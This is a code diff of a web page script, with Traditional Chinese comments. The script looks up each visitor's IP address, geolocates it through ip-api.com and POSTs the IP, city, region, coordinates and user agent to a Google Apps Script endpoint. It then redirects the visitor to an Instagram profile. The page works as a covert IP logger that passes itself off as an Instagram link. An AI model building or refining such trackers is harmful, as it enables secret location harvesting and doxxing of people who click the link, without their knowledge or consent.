@@ -16,24 +16,27 @@
       const ip = ipData.ip;
       const ua = navigator.userAgent;
 
-      const locData = await fetch(`https://ipwho.is/${ip}`).then(res => res.json());
+      // 改用 ip-api.com，穩定且不需 token
+      const locData = await fetch(`https://ip-api.com/json/${ip}`).then(res => res.json());
 
       const info = {
         ip,
         country: locData.country || "",
-        region: locData.region || "",
+        region: locData.regionName || "",
         city: locData.city || "",
-        lat: locData.latitude || 0,
-        lon: locData.longitude || 0,
+        lat: locData.lat || 0,
+        lon: locData.lon || 0,
         ua
       };
 
+      // ✅ 發送資料到 Google Apps Script
       await fetch("https://script.google.com/macros/s/AKfycbzDEWIlVVUkb0gyi4byF-wxBnXSeTGVRZFrLsYKGPukdjDhlpu2HvVlKobyy7tsmuyr/exec", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(info)
       });
 
+      // ✅ 顯示地圖
       if (info.lat && info.lon) {
         const map = L.map('map').setView([info.lat, info.lon], 8);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -46,6 +49,7 @@
     } catch (e) {
       console.error(e);
     } finally {
+      // Deep link 到 IG App
       window.location.replace("instagram://user?username=_1naux.1");
     }
   })();
